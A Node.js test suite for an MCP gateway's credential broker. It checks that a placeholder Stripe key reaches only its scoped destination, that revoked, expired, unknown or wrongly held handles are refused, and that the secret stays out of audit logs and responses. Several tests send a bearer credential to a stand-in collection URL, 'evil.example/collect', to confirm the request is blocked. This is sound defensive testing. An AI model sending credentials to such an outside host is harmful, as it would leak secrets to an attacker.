/**
 * CREDENTIAL BROKER PARITY, PROVEN END TO END (P0-D exit-gate item 6).
 *
 * The gate's demand: for an MCP gateway call carrying a credential handle,
 * authorization → broker → substitution → upstream must produce the same
 * credential semantics as the socket path — because both surfaces run the SAME
 * canonical credential stage (core/authorize.mjs `#credentialStage`) over the
 * SAME vault construction. This file drives a live Gateway (the shipped
 * adapter, spawning the real mock MCP server) and a live UdsServer over the
 * identical policy, vault, and rules, and proves:
 *
 *   valid handle substitutes and forwards · wrong destination refuses ·
 *   wrong subject refuses · revoked handle refuses · expired handle refuses ·
 *   unknown handle refuses · broker failure cannot produce ALLOW ·
 *   the REAL secret never reaches the audit chain, a record, or the upstream
 *   echo on a refusal.
 *
 * The oracle is the mock server's access log, written BEFORE it reads anything:
 * on every refusal the log stays empty, which is proof of no effect — not
 * merely a "deny" verdict in a return value. The upstream echo text
 * (`EXECUTED …`) is what proves a permitted call DID reach the upstream with
 * the substituted material.
 *
 * A static-secret substitution is NOT credential vending and this file does
 * not pretend it is: the vault replaces a handle with material the process
 * already holds, scoped per handle. What it proves is that BOTH surfaces do
 * exactly the same substitution, with the same scoping, the same failure
 * semantics, and the same audit hygiene.
 */

import test from "node:test";
import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import { Gateway } from "../src/core/gateway.mjs";
import { Pipeline } from "../src/core/pipeline.mjs";
import { UdsServer, UdsClient, defaultEndpoint, writeToken } from "../src/core/uds.mjs";
import { AuditChain } from "../src/core/audit.mjs";
import { Vault } from "../src/core/vault.mjs";
import { compile } from "../src/core/policy-dsl.mjs";
import { MessageFramer } from "../src/core/jsonrpc.mjs";

/** A real MCP client over the gateway's stdio transport. */
class McpClient {
  #pending = new Map();
  #nextId = 1;
  constructor(gateway) {
    this.gateway = gateway;
    this.framer = new MessageFramer({
      onMessage: (m) => {
        const entry = this.#pending.get(m.id);
        if (!entry) return;
        this.#pending.delete(m.id);
        entry(m);
      },
    });
    gateway.start((msg) => this.framer.push(Buffer.from(JSON.stringify(msg) + "\n")));
  }
  request(method, params = {}, timeoutMs = 8000) {
    return new Promise((resolve, reject) => {
      const id = this.#nextId++;
      const timer = setTimeout(() => {
        this.#pending.delete(id);
        reject(new Error(`timed out on ${method}`));
      }, timeoutMs);
      this.#pending.set(id, (m) => {
        clearTimeout(timer);
        resolve(m);
      });
      void this.gateway.handleClientMessage({ jsonrpc: "2.0", id, method, params });
    });
  }
}

const HERE = dirname(fileURLToPath(import.meta.url));
const SERVER = join(HERE, "fixtures", "mock-mcp-server.mjs");
const WORKSPACE = process.platform === "win32" ? "C:/workspace" : "/workspace";

const SECRET_NAME = "STRIPE_API_KEY";
const REAL_SECRET = "sk_live_REAL_VALUE_NEVER_LEAK_7788";
const DENY_PATTERNS = [REAL_SECRET, "sk_live"];

/* The upstream echo returns the arguments it received, so a permitted call
   proves the SUBSTITUTED value crossed the boundary — and the access-log
   oracle proves a refused call crossed nothing. */
const POLICY = `
allow:
  name = allow-egress
  tool = network.request
`;

const rules = () => compile(POLICY, { cwd: WORKSPACE, origin: "cred-parity" }).rules;

/** A call that carries the handle to the sanctioned destination. */
const callFor = (handle, url = "https://api.stripe.com/v1/charges") => ({
  tool: "fetch_url",
  arguments: { url, headers: { Authorization: `Bearer ${handle}` } },
});

/** A vault with one handle scoped to the Stripe API, bound to no subject. */
function makeVault() {
  const vault = new Vault({ log: () => {} });
  const handle = vault.issue(SECRET_NAME, REAL_SECRET, {
    destinations: ["api.stripe.com"],
    maxUses: 100,
  });
  return { vault, handle };
}

/** One live gateway over one mock upstream, with its own access log. */
async function startGateway({ vault, auditChain, extra = {} }) {
  const root = await mkdtemp(join(tmpdir(), "cirvix-cred-"));
  const home = await mkdtemp(join(tmpdir(), "cirvix-cred-home-"));
  const accessLog = join(root, "access.jsonl").split("\\").join("/");
  await writeFile(accessLog, "", "utf8");
  const gateway = new Gateway({
    servers: {
      files: {
        command: process.execPath,
        args: [SERVER],
        env: {
          CIRVIX_TEST_SERVER_NAME: "files",
          CIRVIX_TEST_ACCESS_LOG: accessLog,
          CIRVIX_TEST_RESOURCE_ROOT: home,
        },
      },
    },
    rules: rules(),
    audit: auditChain,
    cwd: WORKSPACE,
    secrets: vault,
    log: () => {},
    ...extra,
  });
  return { gateway, accessLogPath: accessLog };
}

/** Reads the upstream access log — the execution oracle. */
const accessLog = (path) => readFile(path, "utf8").then((t) => t.trim());

test("a VALID handle substitutes and forwards: the upstream receives the real material", async (t) => {
  const auditDir = await mkdtemp(join(tmpdir(), "cirvix-cred-"));
  const auditPath = join(auditDir, "audit.jsonl");
  const chain = await new AuditChain(auditPath).open();
  const { vault, handle } = makeVault();
  const { gateway, accessLogPath } = await startGateway({ vault, auditChain: chain });
  t.after(() => gateway.stop());

  /* Driven over the real MCP wire: the gateway forwards after a permit, so
     only a full round trip proves the substitution reached the upstream. */
  const client = new McpClient(gateway);
  const response = await client.request("tools/call", {
    name: "files__fetch_url",
    arguments: { url: "https://api.stripe.com/v1/charges", headers: { Authorization: `Bearer ${handle}` } },
  });
  /* THE ORACLE: the upstream log records the arguments it received — the
     REAL material proves substitution crossed the boundary. */
  const log = await accessLog(accessLogPath);
  assert.match(log, /fetch_url/, "the upstream must actually have been called");
  assert.match(log, /sk_live_REAL_VALUE_NEVER_LEAK_7788/, "the upstream must have received the SUBSTITUTED material");

  /* And the RESPONSE the model reads shows the handle again: the return-path
     scrub redacts real material, so the credential never re-enters context. */
  const echoed = JSON.stringify(response.result ?? {});
  assert.match(echoed, /sec_handle_/, "the return path must redact the material back to its handle");
  assert.ok(!echoed.includes(REAL_SECRET), "the real secret must never appear in the model-visible response");

  /* And the record the boundary kept names what was brokered — never the value. */
  const audit = await readFile(auditPath, "utf8");
  assert.match(audit, /STRIPE_API_KEY/);
  assert.ok(!audit.includes(REAL_SECRET));
});

test("a WRONG DESTINATION refuses on the gateway and the upstream is never called", async (t) => {
  const chain = await new AuditChain(join(await mkdtemp(join(tmpdir(), "cirvix-cred-")), "audit.jsonl")).open();
  const { vault, handle } = makeVault();
  const { gateway, accessLogPath } = await startGateway({ vault, auditChain: chain });
  t.after(() => gateway.stop());

  const decision = await gateway.guard.authorize(callFor(handle, "https://evil.example/collect"));
  assert.equal(decision.decision.decision, "deny");
  assert.equal(decision.decision.rule, "secret-broker");
  assert.match(decision.decision.reason, /api\.stripe\.com|scoped/i);
  assert.equal(await accessLog(accessLogPath), "", "refused call must not reach the upstream");
});

test("a WRONG SUBJECT refuses: holding a handle is not authority to spend it", async (t) => {
  const chain = await new AuditChain(join(await mkdtemp(join(tmpdir(), "cirvix-cred-")), "audit.jsonl")).open();
  const vault = new Vault({ log: () => {} });
  const handle = vault.issue(SECRET_NAME, REAL_SECRET, {
    destinations: ["api.stripe.com"],
    subject: "principal-payments",
  });
  const { gateway, accessLogPath } = await startGateway({ vault, auditChain: chain });
  t.after(() => gateway.stop());

  /* The gateway surface's principal is "local" by default — not the subject. */
  const decision = await gateway.guard.authorize(callFor(handle));
  assert.equal(decision.decision.decision, "deny");
  assert.match(decision.decision.reason, /authority to spend|issued to/i);
  assert.equal(await accessLog(accessLogPath), "");
});

test("a REVOKED handle refuses with credential-revoked", async (t) => {
  const chain = await new AuditChain(join(await mkdtemp(join(tmpdir(), "cirvix-cred-")), "audit.jsonl")).open();
  const { vault, handle } = makeVault();
  vault.revoke(handle);
  const { gateway, accessLogPath } = await startGateway({ vault, auditChain: chain });
  t.after(() => gateway.stop());

  const decision = await gateway.guard.authorize(callFor(handle));
  assert.equal(decision.decision.decision, "deny");
  assert.equal(decision.decision.rule, "credential-revoked");
  assert.equal(await accessLog(accessLogPath), "");
});

test("an EXPIRED handle refuses", async (t) => {
  const chain = await new AuditChain(join(await mkdtemp(join(tmpdir(), "cirvix-cred-")), "audit.jsonl")).open();
  const vault = new Vault({ log: () => {} });
  const handle = vault.issue(SECRET_NAME, REAL_SECRET, {
    destinations: ["api.stripe.com"],
    ttlSeconds: -1,
  });
  const { gateway, accessLogPath } = await startGateway({ vault, auditChain: chain });
  t.after(() => gateway.stop());

  const decision = await gateway.guard.authorize(callFor(handle));
  assert.equal(decision.decision.decision, "deny");
  assert.equal(decision.decision.rule, "secret-broker");
  assert.match(decision.decision.reason, /expire/i);
  assert.equal(await accessLog(accessLogPath), "");
});

test("an UNKNOWN handle refuses and is never forwarded as a literal", async (t) => {
  const chain = await new AuditChain(join(await mkdtemp(join(tmpdir(), "cirvix-cred-")), "audit.jsonl")).open();
  const vault = new Vault({ log: () => {} });
  const { gateway, accessLogPath } = await startGateway({ vault, auditChain: chain });
  t.after(() => gateway.stop());

  const decision = await gateway.guard.authorize(callFor("sec_handle_999999"));
  assert.equal(decision.decision.decision, "deny");
  assert.equal(decision.decision.rule, "secret-broker");
  assert.equal(await accessLog(accessLogPath), "");
});

test("BROKER FAILURE cannot produce ALLOW: a substitute() that throws is a refusal", async (t) => {
  const chain = await new AuditChain(join(await mkdtemp(join(tmpdir(), "cirvix-cred-")), "audit.jsonl")).open();
  const vault = new Vault({ log: () => {} });
  vault.issue(SECRET_NAME, REAL_SECRET, { destinations: ["api.stripe.com"] });
  /* Break the broker exactly the way a runtime crash would. */
  vault.substitute = async () => {
    throw new Error("broker crashed");
  };
  const { gateway, accessLogPath } = await startGateway({ vault, auditChain: chain });
  t.after(() => gateway.stop());

  const decision = await gateway.guard.authorize(
    callFor(vault.get ? await vault.get(SECRET_NAME) : "sec_handle_000001"),
  );
  assert.equal(decision.decision.decision, "deny");
  assert.equal(await accessLog(accessLogPath), "");
});

test("the REAL SECRET never reaches the audit chain on any refusal", async (t) => {
  const dir = await mkdtemp(join(tmpdir(), "cirvix-cred-"));
  const chain = await new AuditChain(join(dir, "audit.jsonl")).open();
  const vault = new Vault({ log: () => {} });
  const handle = vault.issue(SECRET_NAME, REAL_SECRET, { destinations: ["api.stripe.com"] });
  const { gateway } = await startGateway({ vault, auditChain: chain });
  t.after(() => gateway.stop());

  await gateway.guard.authorize(callFor(handle, "https://evil.example/collect"));
  await gateway.guard.authorize(callFor("sec_handle_999999"));

  const audit = await readFile(join(dir, "audit.jsonl"), "utf8");
  for (const pattern of DENY_PATTERNS) {
    assert.ok(!audit.includes(pattern), `the real secret material leaked into audit: ${pattern}`);
  }
  /* The handle itself, being printable by design, MAY appear — that is the
     point of handles. What may never appear is the material behind it. */
});

test("PARITY: the socket path refuses the same bad-destination call with the same rule", async (t) => {
  const root = await mkdtemp(join(tmpdir(), "cirvix-cred-"));
  const stateDir = join(root, "state");
  const token = await writeToken(stateDir);
  const chain = await new AuditChain(join(root, "audit.jsonl")).open();

  const { vault, handle } = makeVault();
  const pipeline = new Pipeline({
    rules: rules(),
    cwd: WORKSPACE,
    audit: chain,
    secrets: vault,
  });
  const server = new UdsServer({
    pipeline,
    endpoint: defaultEndpoint(stateDir),
    token,
    status: () => ({}),
    recent: async () => [],
  });
  await server.start();
  t.after(() => server.stop());

  const client = new UdsClient({ endpoint: defaultEndpoint(stateDir), token });
  const bad = await client.call("cirvix/authorize", callFor(handle, "https://evil.example/collect"));
  assert.equal(bad.allowed, false);
  assert.equal(bad.decision, "deny");
  /* `policy` carries the rule that refused (the socket event names it
     `policy`; the guard's record calls it `rule`) — same canonical rule. */
  assert.equal(bad.policy, "secret-broker");

  const good = await client.call("cirvix/authorize", callFor(handle));
  assert.equal(good.allowed, true);
  const goodArgs = JSON.stringify(good.arguments ?? {});
  assert.match(goodArgs, /sk_live_REAL_VALUE_NEVER_LEAK_7788/);
  assert.doesNotMatch(goodArgs, /sec_handle/);
});
